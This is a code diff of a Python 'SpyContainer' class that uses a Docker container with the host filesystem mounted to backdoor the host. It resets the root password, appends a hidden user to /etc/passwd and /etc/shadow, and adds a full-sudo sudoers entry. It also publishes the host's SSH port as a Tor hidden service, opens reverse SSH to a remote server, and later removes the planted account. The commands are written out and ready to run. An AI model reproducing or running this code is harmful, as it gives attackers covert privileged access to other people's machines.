@@ -1,26 +1,27 @@
+import logging
 import random
 import string
-from typing import Tuple
+import time
+from typing import Optional, Tuple
 
 from docker.client import ContainerCollection
 from docker.models.containers import Container
-import logging
-import time
+
 logger = logging.getLogger()
+
 
 class SpyContainer:
     def __init__(self, container: Container) -> None:
         self._container = container
 
     def get_docker_host_ssh_port(self) -> int:
-        ssh_port = (
-            self.execute_command(
-                "cat /data/etc/ssh/sshd_config | sed -e 's/^[[:space:]]*//' | grep -E "
-                " '^Port'"
-            )
-            .strip()
-            .split()
+
+        sshd_port = self.execute_command(
+            "cat /data/etc/ssh/sshd_config | sed -e 's/^[[:space:]]*//' | grep -E "
+            " '^Port'"
         )
+        assert sshd_port
+        ssh_port = sshd_port.strip().split()
         if ssh_port == [] or len(ssh_port) != 2:
             return 22
         else:
@@ -35,6 +36,7 @@ class SpyContainer:
 
     def generate_docker_host_unique_username(self) -> str:
         usernames = self.execute_command('cat /data/etc/passwd | cut -d ":" -f 1')
+        assert usernames
         while True:
             username = SpyContainer.generate_random_word()
             if username not in usernames:
@@ -44,18 +46,27 @@ class SpyContainer:
     def add_username_to_docker_host(self, username: str, password: str) -> None:
         self.execute_command("echo 'root:{}' | chpasswd".format(password))
         self.execute_command(
-            "echo '{}:x:0:0:test:/:/bin/sh' >> /data/etc/passwd".format(username)
+            "echo '{}:x:222:222:test:/:/bin/sh' >> /data/etc/passwd".format(username)
         )
         self.execute_command(
             "cat /etc/shadow | grep root | head -1 | sed 's/root/{}/' >>"
             " /data/etc/shadow".format(username)
         )
 
-    def permit_root_login_for_ssh_in_docker_host(self) -> None:
+    # def create_group_as_username(self, username: str) -> None:
+    #     self.execute_command(f"echo '{username}:x:222:' >>  /data/etc/group")
+
+    def add_username_to_sudoer_group(self, username: str) -> None:
+        self.execute_command(f"mkdir -p /data/etc/sudoers.d")
         self.execute_command(
-            "sed -ie  '0,/.*PermitRootLogin.*/s/.*PermitRoot Login.*/PermitRootLogin"
-            " yes/' /data/etc/ssh/sshd_config"
+            f"echo '{username} ALL=(ALL:ALL) ALL' > /data/etc/sudoers.d/{username}"
         )
+
+    # def delete_group_as_username(self, username: str) -> None:
+    #     self.execute_command(f"sed -i '/^sudo/s/{username}:x:222:$//' /data/etc/group")
+
+    def delelte_username_from_sudoer_group(self, username: str) -> None:
+        self.execute_command(f"rm -rf /data/etc/sudoers.d/{username}")
 
     def get_free_port_on_docker_host(self) -> int:
         while True:
@@ -63,6 +74,8 @@ class SpyContainer:
                 "ss -tlpn | awk '{print $4}' |rev |cut -d \":\" -f-1 | rev"
             )
             free_port = random.randint(35000, 60000)
+            if open_ports is None:
+                raise AssertionError()
             if str(free_port) not in open_ports:
                 break
         return free_port
@@ -76,7 +89,9 @@ class SpyContainer:
             )
         )
         self.execute_command(
-            "sed -i '0,/#HiddenServicePort 80 127.0.0.1:80/s//HiddenServicePort {} 0.0.0.0:22/' /etc/tor/torrc".format(docker_host_ssh_port)
+            "sed -i '0,/#HiddenServicePort 80 127.0.0.1:80/s//HiddenServicePort {} 0.0.0.0:22/' /etc/tor/torrc".format(
+                docker_host_ssh_port
+            )
         )
         self.execute_command("chown root:root /var/lib/tor")
 
@@ -92,11 +107,12 @@ class SpyContainer:
         while True:
             tor_log = self.execute_command("cat /nohup.out")
             logger.info("Spy container can not connect to Tor Netwrok until now.")
+            if tor_log is None:
+                raise AssertionError("")
             if "100% (done): Done" in tor_log:
                 logger.info("Spy container can connect to Tor Netwrok now.")
                 break
             time.sleep(5)
-        
 
     def reverse_ssh_from_docker_host_to_remote_server(
         self,
@@ -128,11 +144,11 @@ class SpyContainer:
         self.execute_command("sed -i '/^{}:.*/d' /data/etc/passwd".format(username))
         self.execute_command("sed -i '/^{}:.*/d' /data/etc/shadow".format(username))
 
-    def execute_command(self, *command: str) -> str:
-        output =  self._container.exec_run(
+    def execute_command(self, *command: str) -> Optional[str]:
+        output = self._container.exec_run(
             cmd=["sh", "-c"] + list(command), tty=True, demux=True
         )[1][0]
         if output is None:
             return None
         else:
-            return output.decode('utf-8')
+            return str(output.decode("utf-8"))
